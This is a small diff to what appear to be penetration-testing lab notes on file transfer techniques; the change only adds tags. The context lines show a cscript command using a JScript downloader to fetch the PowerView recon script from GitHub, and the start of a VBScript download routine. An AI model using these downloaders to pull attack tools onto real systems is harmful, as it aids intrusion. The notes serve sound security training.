@@ -51,8 +51,9 @@ Run:
 ```powershell
 C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
 ```
+[[powershell]]
 
-#### VB
+#### VB [[vbscript]]
 ```vbscript
 dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
 dim bStrm: Set bStrm = createobject("Adodb.Stream")
